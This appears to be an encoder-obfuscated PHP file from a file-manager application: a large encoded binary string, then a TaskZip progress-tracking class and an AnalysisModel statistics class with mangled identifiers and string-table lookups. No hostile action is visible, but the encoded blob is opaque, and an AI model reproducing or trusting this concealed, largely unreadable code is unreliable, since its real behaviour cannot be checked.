14\377\150\121\241\355\327\321\352\145\161\77\212\340\175\52\301\73"."\12\244\10\236\134\277\374\6\303\44\342\270\161\62\366\320\356\307\363\353\327\363\63\245\210\105\135\267\251\71\100\225\172\131\372\253\172\336\373\111\142\34\340\257\126\331\7"."\353\126\52\313\3\54\3\351\104\224\327\347\342\314\125\64\327\234\31\367\62\367\222\336\270\326\353\71\132\274\112\353\242\266\45\53\320\377\100\36\231\155\103\265\302\14\223"."\x51\x90\x79\x45\x9f\x1d\x1c\x66\x74\x40\xbc\x92\xc0\xfa\x86\x27\x5c\x72\x23\xef\x2\x8b\x61\xe4\x2b\x9c\x11\x10\x57\x3e\xd1\x5a\xd7\xfb\x1b\x12\x46\xf1\x8a\xc0\xf9\xad\xe4\xfc\x9e\xa8\xbb"."\351\272\302\366\77\31\376\230\100\35\272\212\104\63\266\175\260\153\221\102\172\342\323\123\140\1\213\347\127\305\202\311\226\106\105\163\262\330\42\33\360\175\24\65\333\24\114".base64_decode('F9mAJd1yrlg1RtulRMUxTaWsGlMgG8y12+baK/GH2ucGFg/bKALUm7uGxbuK8MM=').base64_decode('R13PQApV7gfwKx4BvGUlq5Crr1TlrzRUSBha2BfrXxONS2ZKEiAT7opnQn19dRM=')."\xb6\x30\xf6\x5\xab\xc\xf1\x19\x7f\x60\x84\xbd\x31\x94\x63\x38\xb6\x4a\x2f\x17\x94\x1c\xbe\xa6\xd0\xde\x80\xa1\xd\x8a\x6d\xe5\x98\x83\xdc\x86\x20\x50\x55\x92\x41\x48\x53\xab\x74\x28\xd2"."\x88\x8b\x28\xc3\x8\x69\xfc\x24\x44\x93\x1b\x57\xaf\xa\xea\xab\xf9\x60\xb\x47\x3f\x96\x29\x6e\x61\x4\x82\x27\x61\xd9\x2a\x88\xd\x81\x8c\x79\x78\x76\x65\xbb\x4\x2\xed\x16\x6e\x7d\x14".base64_decode('ZZWq0HFsb8RWGsONShHtztwKcrW3cJydFq0KqnIiXmdJkzHDXKQa52r7uucRIck=').base64_decode('nTZ5VSGsGutqi+DKAzk5ic4kuSdSmz9I9AJBIT26D2j4mUYdpAiI14rU3CjGKLE=')."\31\300\67\41\241\17\13\54\64\301\365\114\200\43\31\142\124\361\235\51\242\166\267\304\133\47\233\67\323\212\360\376\277\165\153\55\14\154\71\275\111\241\212\356\5\141\314"."\xf1\xc2\xb0\x0\x2e\x60\x68\x57\x73\x7f\x86\x62\xad\x9c\x49\x40\x58\x1e\xfa\x2b\xca\xc4\xe2\x6b\x44\x84\xa\x28\xae\xc4\x1\x66\x36\x4d\x62\x83\x3\x8d\x81\x5\x5b\xb7\x6\x75\x66\xf1\xc4".strrev('Ä3Ê~êû{S¹°Rl·âÁaß<›”œŞ'."\0".'zÔ~wƒãMÏ'."\0".'ÙX3¬')."\322\30\113\250\267\54\147\323\77\135\364\247\327\363\140\70\56\230\136\216\344\224\236\4\210\362\44\344\166\160\333\61\316\137\351\220\157\154\320\160\250\122\221\243\354\151\32".strrev('¥œì«È]QÂñˆ†"8ğI½€“É,ØàxÖ„,±G®\' D)éÚ¾A³ÒPâr')."\x57\x1c\x17\x9d\xa2\xef\xea\x35\x90\x57\x54\x46\xd4\x71\x95\x66\x69\x50\x40\x5a\x6f\x6f\x20\x5e\xe4\x1b\x10\x5d\xa2\x29\x40\x10\x44\x53\x56\x61\x2\xa4\x58\x5a\xa9\xbd\x81\x34\xd7\x2e\x6a"."\x1a\x2a\x4f\x48\x4c\xbd\x8f\xa0\x82\xd\xa\xa3\x8e\x65\x95\x8f\x98\xe5\x98\x68\xe3\xe3\x17\x75\xe0\xfd\xa2\xfe\x24\x5c\x78\x8\xc5\xe1\x94\x7\x18\xac\x93\x4e\xa7\xbf\x73\x4e\x62\x88\x42".strrev('prÀünİØz™fôÚÍÆbØU=M"öa¤L—Ô§<'."\r".''."\r".'ûœ‡T&êµi*Ó')."\376\40\10\20\230\176\253\152\30\334\216\14\63\214\174\333\42\322\261\226\207\65\100\317\320\122\305\252\43\266\77\354\162\76\215\257\314\332\0\226\134\360\141\7\200\250\360"."\x0\xd5\x4a\xb6\x37\xb3\xeb\x15\xcc\xf4\x4c\x5c\xb4\x62\x39\xc9\x49\x28\xa1\xca\x46\x61\xc8\x95\x54\xa7\x7a\xaa\xc\x4e\x73\xab\x2f\xcd\x70\xe9\x41\x68\xb3\x4a\x26\x73\x58\xd8\xda\xdc\xdc"."\354\157\156\101\377\363\143\141\340\333\332\330\175\177\51\113\163\163\33\371\237\46\20\125\56\314\205\73\5\55\175\106\263\40\303\204\246\101\203\140\103\50\353\106\225\261\126"."\x3\x61\x7c\xd3\x4a\xc1\x4d\x1b\x62\xfc\x3\x6b\x3f\x9a\x6\xe2\x47\x90\x91\x8f\x95\x92\x40\xb8\x52\x21\xc7\x8e\x10\xd3\xbc\x83\xc0\xcf\x73\x61\x62\xd9\x3e\x8c\xe9\x5\xb\x23\x9e\x6\x8d"."\x2a\x19\x14\x68\x2f\xbf\x8e\x87\xb2\x9\xf4\x59\x49\x6f\x3f\xb6\xf3\x46\x45\x8c\xfc\x80\xfc\xb1\x0\x1b\x5c\xa\x14\x9e\x8d\xfd\x2c\xc1\x2f\x3f\x65\x0\x85\xe8\xc6\x20\xe\x33\x5c\x4d\x43"."\x65\xdc\xe\xa\x31\x4\x6d\xd0\x39\xde\x4f\xc\x90\xf4\x26\x98\x41\x93\x9c\x2e\xe2\xa8\x7c\x66\x41\x92\xf9\xed\x37\x12\x2b\xf1\xeb\xf5\x38\x1a\xe7\x35\xd1\x17\x33\xa8\x27\x7b\x18\xc3\x3a".strrev('4yn©¶{®KÕ8Ü¸À¬Çhf5\\xŠ¥æœ)ŒxSÑÆb2\'4\\˜')."\x57\xe2\x8c\xf2\x28\xa1\xb5\x1a\xe2\x4f\x83\x50\xd3\x41\xf6\x79\x5\x16\x1e\xf0\x7\x78\x8b\x20\x2f\xb8\x51\x6b\xcf\xb6\xc3\x6a\xe6\xcf\xf1\xce\x1d\x99\x6\xcb\x14\xb7\x64\x6b\xde\xe5\x64"."\61\151\62\230\152\74\365\1\266\67\14\22\141\0\152\255\22\346\56\11\245\12\274\111\236\62\241\274\364\162\244\55\174\21\206\271\43\124\331\101\41\75\335\227\154\100\154".base64_decode('8LYujvNZHeOSfBOoWGYBzY4t9xXB++qDefbanHUy8Q7J+WQgPplgzx8CookLtqo=')."\170\120\125\312\52\136\200\220\200\356\165\46\45\204\371\303\73\62\20\313\113\262\1\7\61\175\165\327\201\5\61\67\204\267\354\175\160\205\211\323\16\74\177\51\33\376\321"."\154\202\126\140\125\207\254\220\325\115\146\33\202\107\103\234\323\272\341\24\106\205\133\327\321\116\232\220\233\222\306\136\336\4\202\104\360\36\127\100\154\150\74\3\50\160\25"."\126\127\173\273\134\314\235\366\322\271\227\262\300\27\131\56\74\204\134\67\47\53\255\361\360\145\144\275\3\136\164\75\374\161\310\72\110\347\106\254\32\14\42\233\66\256\240"."\x8d\x13\x24\x29\x86\xc4\x2c\xc6\x89\xe5\x59\x7b\xc7\xaa\x1a\xe3\x1e\x25\xea\xa5\x38\x82\x76\x1\xa5\x49\x17\x2d\xd3\xe1\x92\x5\x4e\xf\xe5\x25\x8a\x1c\x93\x79\x87\x34\x2d\xe2\x5f\x2d\xbe"."\343\72\343\222\174\27\363\254\150\267\141\137\127\331\16\104\14\266\210\317\175\111\330\361\104\275\106\135\144\267\160\30\301\147\116\237\15\376\154\23\236\316\224\144\123\123\347"."\xb\x50\x88\x17\x81\x6d\xcc\xd2\x72\xa6\x45\xa4\x5e\xe9\xe6\xbf\xe1\x24\xb5\x82\x1c\x8d\x99\x5c\xda\xc7\x67\x2a\x5a\x9d\x2a\xb0\xb3\x15\x9\xc5\x31\x16\x20\x39\xb4\x2a\xbb\x6e\x91\x7c\x46"."\243\230\344\244\133\142\107\374\55\12\347\143\62\264\146\32\131\50\45\220\374\365\130\32\217\6\112\272\65\100\304\354\124\65\313\17\2\74\214\6\273\210\240\310\373\70\273"."\131\200\53\40\136\64\160\17\154\71\15\125\213\375\303\212\236\311\105\310\67\153\212\320\64\274\225\12\137\24\162\212\215\344\62\74\124\63\247\324\371\24\111\222\106\64\307".strrev('§ø…8éLyä‚Œûs'."\0".'ĞZĞ³@¹±K|”õÌıZ[ùíÙ)„‚AˆèÀò=')."\x10\xf7\xf7\x89\x2b\xe\x3e\x9f\xc4\x67\x7\x8f\x59\xd2\xbe\xa5\x71\x3\x3d\xe2\xbc\x42\x26\x2b\xe2\xd4\x9b\xda\xed\xe1\xc\xfd\xf5\xd2\xe9\x8\xe1\xe4\x2e\x97\x59\xa3\x27\x3\x5a\x19\xee".base64_decode('dHAEXna92Y3wwGUb46kEnL3LDs5JKdEPYSGKQCZ1Ny4NjDi9p249mGkrp0sCnDY=')."\71\260\326\2\40\300\115\173\341\376\46\274\301\330\64\37\337\337\164\351\126\172\247\370\55\73\154\237\203\67\11\156\137\151\313\21\226\312\221\323\166\105\250\75\222\253\64"."\7\361\134\23\32\273\212\311\164\0\175\75\175\101\16\352\344\313\223\312\215\302\233\120\230\31\375\210\147\276\47\312\172\116\211\45\326\104\303\241\130\127\64\265\126\51\150"."\216\364\74\75\161\326\357\136\312\104\345\105\7\236\141\165\226\373\253\307\101\177\26\61\225\376\74\347\255\155\301\105\113\126\131\322\143\74\356\152\51\376\151\126\115\215\6".strrev('^53¬FÑ¹İıÿ_ÈÓ­P*X´[¹ySüÚ´±\\ÊK^„—ruyƒ)ªQa¾')."\x37\xc6\x75\x5b\x17\xb\x9f\x95\x98\x92\x6b\x17\xaa\x4a\x8b\x3f\x99\x90\x97\x5f\x58\x90\x66\x40\xc\x36\xfd\x4a\xad\x33\x2b\x70\x5\x24\x3b\xea\xf6\x8\xcd\x74\x9a\x64\xa7\x66\x15\xa6\x78"."\207\207\352\304\23\35\44\52\75\236\122\261\124\335\326\44\0\175\305\143\1\134\134\100\42\276\353\371\265\322\260\24\255\272\167\320\272\237\312\320\17\60\230\344\67\255\136"."\x86\x24\x7e\x43\xfb\x7f\xdc\x54\x3d\x2f\xfc\x17\xe9\x79\x66\xd\xc0\xef\x99\x51\x1f\xf0\x61\xf9\xa9\x3e\xf6\xcd\x9a\x7\x62\x3e\xf0\xa9\x19\x9f\x38\xaa\xc8\x10\x5f\x30\xec\x3d\x2b\x93\xb0".base64_decode('2MATUlg0kaFPq4lPIJnNmqrIJ0fBfJAPMQ1gN20RpjTGEcEA4+xQG/4cFYGQQIY=')."\xb5\x2f\x8c\x55\x66\x56\x87\x88\x1e\xc0\x38\xbb\x4e\x4e\x3d\x8f\xe6\x78\x8d\x32\x5d\xaf\x61\xd7\x7c\x3\xdb\x76\x41\x3d\x44\xbf\x83\x72\xe\x89\xce\xa1\x18\x7f\xd7\x41\x14\xf5\xa6\xd4\x69".strrev('‹M°	 '."\n".'š[ÙÃÄ¸â¹H¥cˆÅf·b¬¯Ô÷Œúf•ÚPgƒ„VJ'."\0".'')."\131\236\252\1\270\324\26\61\326\56\156\4\207\337\51\60\206\115\171\374\10\341\305\246\365\364\215\65\52\207\372\20\117\257\71\265\317\256\320\342\377\47\5\151\142\112\62".strrev('8U$'."\r".'=usˆ#«Øn÷å;—!¢Ò1ë×'."\r".'÷ˆa­Ü\'4S(¿'."\n".'ö	¥»Û ÛRWt'."\r".'')."\227\376\14\302\57\333\214\274\125\123\362\3\137\237\317\121\45\134\324\113\171\213\233\136\10\100\257\46\104\112\122\12\133\37\250\354\245\121\362\334\124\27\243\264\360\360\204"."\373\355\13\16\126\334\57\151\210\7\112\304\316\347\176\302\201\37\31\332\2\305\155\307\365\104\110\332\114\253\5\37\345\247\60\255\22\261\316\51\71\54\233\133\222\136\240".base64_decode('RKatyfNZXC1lYO915X3kMSlKwLwvW0jrh1NFuXShZGbVUpJaLLmuV1hIFuJWiK4=')."\x6c\x14\x14\x54\x2b\x95\x19\x8f\x34\x80\xc7\xa1\xc7\x1b\x55\x23\x4a\x55\xc5\x2e\xa8\x25\xc9\x5a\xb2\xc1\x2b\x3d\xc8\x11\x37\x96\x20\x3b\xfa\x5a\x1f\x3d\xb9\x81\x6e\xcb\x55\xb2\xd3\x34\xae".base64_decode('nOyW3pUO1p6+YYsqWO2ywSEchAZkYQgyKKsUMcGuRYYRAnGkPhIgq1hmnt8HyvE=')."\xd0\xfd\xf6\x9\x45\x58\xf2\xd3\xa5\xd\x73\x49\x2\xc7\xc5\x4e\x2b\xfb\x66\x10\xa7\xee\xde\x67\xb4\xd8\x67\xf8\x9b\x60\x3e\xda\x33\xf1\xd2\x23\x7d\x1\xcc\xc7\x5f\xfb\xf2\x51\x3f\x79\x3e".base64_decode('eOPLJ26evd/zKeK5WPcbs7jN3EKvhqX3cvN8qDwFkt6BS5u1Oj5x5mhUy+IUF0U=')."\334\322\115\115\207\245\36\126\255\222\217\234\270\372\230\307\62\317\160\210\136\311\63\123\147\14\77\270\16\152\250\111\104\226\274\233\352\264\255\312\132\354\324\312\233\115\167"."\141\135\306\322\304\15\14\352\265\261\346\231\236\215\345\174\353\242\45\53\144\325\200\230\37\161\376\3\127\273\341\54\12\170\0\61\343\212\33\237\24\346\52\122\136\267\44"."\321\155\103\133\373\30\237\207\2\377\317\60\137\360\336\64\253\144\321\132\373\144\151\315\10\20\44\224\254\73\244\15\311\163\224\157\342\23\166\133\54\37\272\5\211\47\370".base64_decode('3N+im3Kdfkj7jlgJ9E00s4Ql1DLWsjqW6hbH6kkdZCSYiKOTB481b9vJwIAuQiQ=').strrev('ó¨İ“Áç§QÈa…Aä™`ÿÊH’šÅj7ÄÛ`”a/ˆ—Ş8¸)zc£\\‰bK')."\xe6\x9d\x74\x1a\xfe\x3e\xed\xa6\x3c\x13\x97\xb2\xfc\xaa\xe3\x97\x10\x52\x52\xbe\x69\x4e\x82\x4c\x30\x70\x1f\x42\xe8\x73\xf7\xd5\x53\x3d\x2a\x26\xea\x18\xf2\x29\x33\x65\xaa\x65\x9c\xa4\xa7".base64_decode('8YQvJYllwqXZ1b0ZZGZGnORH/5yiEAroCnWtVskBq3yXiVQkL4PaqqW314Qaheg=')."\135\240\23\260\206\211\213\110\162\207\55\264\206\337\153\123\45\343\33\74\236\322\263\227\246\34\166\137\32\117\60\227\227\350\173\56\51\15\305\273\74\57\243\22\72\344\175"."\56\225\15\12\131\374\202\256\111\27\44\135\42\1\177\331\312\45\42\330\336\107\347\20\113\45\73\243\105\121\216\366\260\201\2\1\44\126\316\364\153\322\376\50\266\102\21"."\232\351\245\165\367\63\354\256\173\244\330\13\220\147\255\263\333\251\266\347\51\110\352\120\224\206\31\173\375\177\375\312\332\377\253\307\325\226\160\107\374\256\207\125\327\0\223"."\313\70\262\151\311\25\61\125\224\172\372\341\336\46\17\5\54\342\117\11\113\161\156\312\311\74\101\61\7\121\52\73\134\121\113\45\357\111\143\215\130\120\363\6\45\102\276"."\121\376\160\142\275\210\333\261\160\106\176\70\270\216\144\312\270\115\351\35\142\75\67\132\347\140\20\17\176\314\355\225\127\342\21\152\262\11\162\205\130\11\346\41\53\310\102"."\71\54\65\141\106\222\121\111\371\342\143\242\302\344\253\371\100\230\207\116\146\324\204\134\245\6\242\42\23\22\27\250\206\374\244\135\103\352\2\312\243\45\336\121\347\257\70"."\xbb\x4a\xf4\x7a\x1e\xe5\xa3\x99\x6c\x79\x6c\x5d\xfa\x69\xc2\x76\x54\xaa\x8e\xc7\xbb\xf\x95\x2d\xe4\x52\xf2\x51\x72\xed\x7\xf8\x4a\x97\x8b\x60\xab\x58\xb7\xb6\x87\x3f\xa4\xdc\xec\x7d\x59"."\271\305\137\373\61\152\242\216\25\16\111\54\342\63\245\15\71\345\40\247\220\165\312\120\314\114\211\74\63\254\215\372\53\224\277\227\50\331\376\242\220\334\137\266\322\373\54"."\223\214\235\33\312\325\36\222\101\242\364\252\157\315\253\235\236\323\2\44\77\211\343\63\335\44\136\273\241\333\251\376\336\46\162\313\2\220\31\261\377\335\246\170\135\275\134".strrev('¦ÃN_¹d¼½xq²–ËLå²õÕ¦/v÷¶$»‚ü¶]´¹'."\0".'`{$›×e×y4z¡')."\72\256\221\26\156\326\275\356\325\211\34\115\105\143\227\204\14\347\230\62\110\72\346\103\314\162\336\375\136\3\111\44\140\346\271\21\152\220\16\252\334\347\204\334\375\164\15".strrev('âK<âGµ"¯sN–Sß¹KõX€ÑÆ‡ÁU2H¾¾/ĞÁb”™)1ê«İ')."\x58\x31\x2c\xc9\x8\x82\xee\x81\x4b\xbb\x86\x20\x96\xea\xb8\x60\x72\x4\x2f\x9d\xcf\xf3\xb7\xbb\x5d\x59\xf3\x4c\x9a\xe0\x50\x4\x11\xcf\x7c\x63\x26\x49\xba\x55\x2a\xcc\x93\xb5\x9\xef\xd3"."\xac\x1\xf9\x26\xaa\x2b\x63\x2d\x54\xdc\x3a\x95\xca\x8b\xa3\x5\xd1\x4d\xc\xab\xd7\x7d\xb2\x9c\xdc\xc5\xe5\x5b\xad\x1c\xa9\x4\x88\x7a\xdc\xe7\xf6\x36\x92\xdc\x82\xcd\xec\x85\x21\xe\xed".base64_decode('ChfCxSfdd2h5Nj5nKA+54uB3QT2SGFZpsP3fk2TLz5K7DwtlrYCEAlopJlUnHyQ=')."\316\130\40\125\377\43\2\53\335\103\54\135\76\26\11\154\257\63\135\203\57\21\102\336\61\310\231\224\23\135\315\361\116\55\21\42\4\372\122\140\231\250\101\151\132\310\235".base64_decode('RPNrntbLBbw9oyXsCd3JFSXJpjaxFm7VDCp8qH57va1iY+qV90QlNe2RrBHSZp0=').base64_decode('MrRFdYvRJFxSMJ+usjMMAS5Lk3DZmmRWWFKPSOUctWrP0L3awQOdQb5Ohz2SNc0=')."\72\323\170\326\315\134\373\71\300\70\157\156\242\144\250\337\12\241\33\360\234\12\327\153\105\335\314\63\266\102\344\366\354\2\365\150\55\113\251\103\135\205\171\100\55\35\27"."\151\165\214\25\150\235\170\217\226\235\21\325\111\226\55\37\352\333\106\44\353\56\175\333\155\264\340\201\313\3\303\14\230\220\250\47\236\230\227\214\201\347\272\110\172\325\30"."\x35\x4c\xbe\x4d\xe4\x85\x99\x19\x36\x5b\xe5\x8f\xb2\xf3\xcf\xd5\xd4\xe6\x46\x4d\xa3\x2a\x79\xe5\xac\x6b\x9b\xec\xc3\x82\x79\xad\x8\x5c\x52\x99\x9a\x5d\x32\xea\xa6\x42\x8f\xe9\xe8\x39\xcd"."\xed\xfa\x53\x76\x43\x44\xd3\xd9\x47\x4a\x92\x3a\xcf\xa3\x49\x13\x6a\x2\xd7\xf9\x7a\x1d\x5d\x13\x1\x1\x2b\x27\x34\xd6\x2e\x43\x79\xba\xff\x83\xaa\x9e\x9e\xc0\x85\xf1\x49\x2f\x3f\xa5\x21"."\xbe\x29\xe9\x7e\x49\x93\x53\xa6\xe5\xf8\x70\x5a\xda\xac\x90\xdf\x4e\xd3\x71\xc4\x89\x34\x15\xbe\x9\x93\x87\x37\x3d\x9f\x64\x58\x81\x42\xe2\x48\x6\x8f\x22\x39\x25\x20\xe8\x48\xc8\x6\x9"."\302\131\40\226\152\123\32\115\45\304\306\25\301\247\17\74\42\357\151\160\46\330\135\365\234\132\12\0\222\101\263\346\44\363\374\207\257\343\212\366\210\267\334\125\57\43\47"."\x78\x10\xc0\x37\xd9\x4c\x84\x5c\x7a\xb6\x83\x34\x25\x8\xde\xe3\xfd\xa4\xe\x78\xe9\x29\x30\x52\x29\xb8\x8a\xd3\xf7\x72\xb8\xe9\xe3\xfb\xd5\x0\x9a\x4e\x51\x5\x75\x1d\x4d\xf4\x51\xd8\xbf".strrev('íš(k„g‰Ğ¶MXÑCzE¥3â$õõ$Ôİ™%)2MtÓÔ]’\'Ö¥JÔ“Xœõ:').base64_decode('I60MxWKJ9TO1IhpeK1pCDlqFAr1SNJlenB0wpNQSE8Wlu3taWfgIE2XcGgZ5Xm0=')."\xe6\x3e\x8f\x7\xdc\xcf\xb6\x78\xc\xe1\x18\xc2\x42\x45\xd8\xba\x26\xe\x75\x27\x2b\x0\xc5\x9e\xb7\xf9\xe2\xe6\xcc\xb2\x38\x39\xe\xb8\x4e\x98\x25\x38\x59\x1b\x84\xa2\x48\x38\x27\x6f\xa6".base64_decode('BLCg7gDJytfawwCSKgYAN+wUE0yzRsyspOynogrcn4MhlSyoaBiS/zdAoUcXLac=')."\x0\x0"."", 10, -8))); goto b‰²‹¬º‚Ô; CŒˆŠ†ÀÑ¤: class TaskZip extends TaskFileTransfer { protected function startAfter() { $’ÄËÖèò =& $_SERVER[Æ š¦İÈ]; parent::startAfter(); Hook::bind($’ÄËÖèò[1739], array($this, $’ÄËÖèò[1734])); $¬·î°¿§ =& $this->task; $¬·î°¿§[$’ÄËÖèò[1736]] = $’ÄËÖèò[1188]; if (!$¬·î°¿§[$’ÄËÖèò[1544]]) { $¬·î°¿§[$’ÄËÖèò[1544]] = LNG($’ÄËÖèò[1740]); } } protected function endAfter() { $ûã›Ôùˆ =& $_SERVER[Æ š¦İÈ]; parent::endAfter(); Hook::unbind($ûã›Ôùˆ[1739], array($this, $ûã›Ôùˆ[1734])); } public function updateAfter() { $¼ä´åş‰ =& $_SERVER[Æ š¦İÈ]; $³Çô¥˜½ =& $this->task; if (!$³Çô¥˜½[$¼ä´åş‰[783]] || !$³Çô¥˜½[$¼ä´åş‰[760]]) { return; } if ($³Çô¥˜½[$¼ä´åş‰[1736]] == $¼ä´åş‰[1188]) { $Â‡¬Ê¯ = $³Çô¥˜½[$¼ä´åş‰[1693]]; if ($³Çô¥˜½[$¼ä´åş‰[1694]] != $¼ä´åş‰[1188]) { $Â‡¬Ê¯ = 0; } $¤ø“‡Ú› = ($³Çô¥˜½[$¼ä´åş‰[1697]] + $Â‡¬Ê¯) / $³Çô¥˜½[$¼ä´åş‰[760]]; $³Çô¥˜½[$¼ä´åş‰[1646]] = $¤ø“‡Ú› * 0.3; } else { if ($³Çô¥˜½[$¼ä´åş‰[1736]] == $¼ä´åş‰[310]) { $¤ø“‡Ú› = $³Çô¥˜½[$¼ä´åş‰[1645]] / $³Çô¥˜½[$¼ä´åş‰[783]]; $³Çô¥˜½[$¼ä´åş‰[1646]] = 0.3 + $¤ø“‡Ú› * 0.5; } else { if ($³Çô¥˜½[$¼ä´åş‰[1736]] == $¼ä´åş‰[108]) { $¤ø“‡Ú› = 0; if ($³Çô¥˜½[$¼ä´åş‰[1692]]) { $¤ø“‡Ú› = $³Çô¥˜½[$¼ä´åş‰[1693]] / $³Çô¥˜½[$¼ä´åş‰[1692]]; } $³Çô¥˜½[$¼ä´åş‰[1646]] = 0.3 + 0.5 + $¤ø“‡Ú› * 0.2; } } } if ($³Çô¥˜½[$¼ä´åş‰[1646]] > 0) { $Àóû—·î = timeFloat() - $³Çô¥˜½[$¼ä´åş‰[1648]] - $³Çô¥˜½[$¼ä´åş‰[1651]]; $³Çô¥˜½[$¼ä´åş‰[1652]] = $Àóû—·î * (1 - $³Çô¥˜½[$¼ä´åş‰[1646]]) / $³Çô¥˜½[$¼ä´åş‰[1646]]; } } public function copyFileStart($ÒÆê¬, $ù¼¾ˆ¶Æ, $Û‘àÙŸ, $À˜‘´®ß, $şûŠâ¡Õ, $üè²ìûÓ) { $Àå‹îß‰ =& $_SERVER[Æ š¦İÈ]; parent::copyFileStart($ÒÆê¬, $ù¼¾ˆ¶Æ, $Û‘àÙŸ, $À˜‘´®ß, $şûŠâ¡Õ, $üè²ìûÓ); $İªçÃóı =& $this->task; if ($İªçÃóı[$Àå‹îß‰[1736]] == $Àå‹îß‰[310]) { $İªçÃóı[$Àå‹îß‰[1736]] = $Àå‹îß‰[108]; } $this->update(); } public function copyFileEnd($ù°±åĞì, $ì®£—­è, $ÅÚÜ’Åõ, $˜Üæ, $¿ˆİ˜‘è, $çÕ¯û©) { $Æ¤µéÛ =& $_SERVER[Æ š¦İÈ]; $µó£Íº =& $this->task; $µó£Íº[$Æ¤µéÛ[1693]] = $µó£Íº[$Æ¤µéÛ[1692]]; $µó£Íº[$Æ¤µéÛ[1697]] += $µó£Íº[$Æ¤µéÛ[1692]]; $µó£Íº[$Æ¤µéÛ[1694]] = $Æ¤µéÛ[12]; $this->update(); } public function nameParse($ó—¡—ù…) { $„¶Ò÷› =& $_SERVER[Æ š¦İÈ]; $¡Æš¡Ê§ =& $this->task; if ($¡Æš¡Ê§[$„¶Ò÷›[1645]] < $¡Æš¡Ê§[$„¶Ò÷›[783]]) { $ˆ‘¡àÆ = get_path_this($ó—¡—ù…); if (strstr($ˆ‘¡àÆ, $„¶Ò÷›[10])) { $¡Æš¡Ê§[$„¶Ò÷›[1645]] += 1; } } if ($¡Æš¡Ê§[$„¶Ò÷›[1736]] == $„¶Ò÷›[1188]) { $¡Æš¡Ê§[$„¶Ò÷›[1736]] = $„¶Ò÷›[310]; } $¡Æš¡Ê§[$„¶Ò÷›[1690]] = $ó—¡—ù…; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($°á³šáĞ) { $‹É÷Úî™ =& $_SERVER[Æ š¦İÈ]; $Õû¤Í‘» = array($‹É÷Úî™[596] => array($‹É÷Úî™[33] => $‹É÷Úî™[1741], $‹É÷Úî™[270] => array($‹É÷Úî™[221], $‹É÷Úî™[762], $‹É÷Úî™[1742], $‹É÷Úî™[1743])), $‹É÷Úî™[1744] => array($‹É÷Úî™[33] => $‹É÷Úî™[1745], $‹É÷Úî™[270] => array($‹É÷Úî™[221], $‹É÷Úî™[760], $‹É÷Úî™[1746], $‹É÷Úî™[1747], $‹É÷Úî™[1748]))); if (!isset($Õû¤Í‘»[$°á³šáĞ])) { return !1; } $this->optionType = $Õû¤Í‘»[$°á³šáĞ][$‹É÷Úî™[33]]; $this->field = $Õû¤Í‘»[$°á³šáĞ][$‹É÷Úî™[270]]; return !0; } public function listData($å»ö½öå = false, $å‰©şìÊ = "\155\157\x64\x69\x66\x79\124\151\155\145", $ôÂÚ šñ = false) { return parent::listData($å»ö½öå, $å‰©şìÊ, $ôÂÚ šñ); } public function trendList($‹“ğù·) { $ãû„æ =& $_SERVER[Æ š¦İÈ]; $ıœØöìŠ = $this->listData(); if ($ıœØöìŠ) { $†Ã‰ùƒù = end($ıœØöìŠ); $°õÎ´ÑÌ = date($ãû„æ[1749], strtotime($ãû„æ[1750])); if ($†Ã‰ùƒù[$ãû„æ[221]] == $°õÎ´ÑÌ) { return $ıœØöìŠ; } $‘Á”ìú = strtotime($†Ã‰ùƒù[$ãû„æ[221]]); } if (!isset($‘Á”ìú)) { $¾¦øü = $‹“ğù· == $ãû„æ[596] ? $ãû„æ[540] : $ãû„æ[822]; $‘Á”ìú = Model($¾¦øü)->min($ãû„æ[195]); } $›Ê› Ñ× = $ãû„æ[1751] . ucfirst($‹“ğù·); $úù¿™®¤ = $this->dateList($‘Á”ìú); foreach ($úù¿™®¤ as $°õÎ´ÑÌ) { $this->{$›Ê› Ñ×}($°õÎ´ÑÌ); } return $this->listData(); } private function dateList($öÀ´€¦è) { $Ó®êòØú =& $_SERVER[Æ š¦İÈ]; $í²£ĞøÅ = $öÀ´€¦è; $Ñµä¹ÔŠ = strtotime($Ó®êòØú[1750]); $éô®Ç…â = array(); while ($í²£ĞøÅ <= $Ñµä¹ÔŠ) { $éô®Ç…â[] = date($Ó®êòØú[1749], $í²£ĞøÅ); $í²£ĞøÅ = strtotime($Ó®êòØú[1752], $í²£ĞøÅ); } return $éô®Ç…â; } public function _recordUser($İïªê  = '') { $Ó«ÂòÇç =& $_SERVER[Æ š¦İÈ]; $”…ºÀ = strtotime(date($Ó«ÂòÇç[1753], strtotime($İïªê ))); $ƒø™ûÖ• = strtotime(date($Ó«ÂòÇç[1754], strtotime($İïªê ))); $ü¶é¹ = array($Ó«ÂòÇç[195] => array($Ó«ÂòÇç[1004], $ƒø™ûÖ•)); $¦õ›×Æ = Model($Ó«ÂòÇç[540])->where($ü¶é¹)->count($Ó«ÂòÇç[1644]); $ü¶é¹[$Ó«ÂòÇç[195]] = array($Ó«ÂòÇç[330], array($”…ºÀ, $ƒø™ûÖ•)); $éïığ‰Ò = Model($Ó«ÂòÇç[540])->where($ü¶é¹)->count($Ó«ÂòÇç[1644]); $ü¶é¹[$Ó«ÂòÇç[33]] = $Ó«ÂòÇç[1755]; $¥ıµÚ¢¬ = Model($Ó«ÂòÇç[1756])->where($ü¶é¹)->count($Ó«ÂòÇç[1757]); $´İ‚ªáõ = array($Ó«ÂòÇç[221] => $İïªê , $Ó«ÂòÇç[762] => (int) $¦õ›×Æ, $Ó«ÂòÇç[1742] => (int) $éïığ‰Ò, $Ó«ÂòÇç[1743] => (int) $¥ıµÚ¢¬); return $this->insert($´İ‚ªáõ); } public function _recordStore($ŠÒ¨Œ £ = '') { $´“ïÊöš =& $_SERVER[Æ š¦İÈ]; $ñ„©ÏÆû = strtotime(date($´“ïÊöš[1754], strtotime($ŠÒ¨Œ £))); $ÉŠ…šõÚ = array($´“ïÊöš[195] => array($´“ïÊöš[1004], $ñ„©ÏÆû)); $»ø¥ÇÕì = Model($´“ïÊöš[472])->where($ÉŠ…šõÚ)->sum($´“ïÊöš[80]); $ÉŠ…šõÚ[$´“ïÊöš[413]] = 0; $ÇèŒ‰œ™ = Model($´“ïÊöš[822])->where($ÉŠ…šõÚ)->sum($´“ïÊöš[80]); $ÉŠ…šõÚ[$´“ïÊöš[414]] = 1; $ôö¢ÌƒÅ = Model($´“ïÊöš[822])->where($ÉŠ…šõÚ)->sum($´“ïÊöš[80]); $ÉŠ…šõÚ[$´“ïÊöš[414]] = 2; $›ûÖÍ¼ = Model($´“ïÊöš[822])->where($ÉŠ…šõÚ)->sum($´“ïÊöš[80]); $‡–û…¬Í = array($´“ïÊöš[221] => $ŠÒ¨Œ £, $´“ïÊöš[760] => (int) 